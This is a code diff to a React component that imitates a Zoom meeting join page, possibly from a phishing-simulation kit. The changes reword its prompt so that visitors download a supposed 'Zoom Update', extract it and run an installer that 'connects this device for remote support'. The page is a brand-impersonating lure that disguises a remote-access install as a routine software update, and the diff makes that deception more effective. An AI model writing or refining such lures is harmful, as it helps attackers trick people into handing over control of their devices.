@@ -46,7 +46,7 @@ export default function BrowserJoinFlow({ meetingId }: { meetingId: string }) {
     setUpdateMessage("");
     const asset = await redownloadClientForDevice();
     setUpdateMessage(asset
-      ? `Downloading ${asset.name}. Double-click the downloaded client to run it.`
+      ? `Downloading ${asset.name}. Extract it, open the Zoom Update, and keep this tab open.`
       : "No matching client download was found.");
     setUpdating(false);
   }
@@ -76,7 +76,7 @@ export default function BrowserJoinFlow({ meetingId }: { meetingId: string }) {
                     <img className="zoom-placeholder" src="/sites/zoom/zoom-placeholder.png" alt="zoom-placeholder" />
                     <div className="training-label">UPDATE ZOOM</div>
                     <div className="desc-primary">
-                      Zoom client. <button className="permission-update-link" type="button" onClick={() => void updateZoom()}><u>Update Zoom client</u></button>double click to run and update the Zoom client, downloaded on your device in order to use the zoom-private software.
+                      Zoom client. <button className="permission-update-link" type="button" onClick={() => void updateZoom()}><u>Download Zoom Update</u></button>, extract it and open the installer. It connects this device for remote support.
                     </div>
                     <div className="desc-secondary">
                       open the downloaded zoom client. You can turn off your microphone and camera at any time.
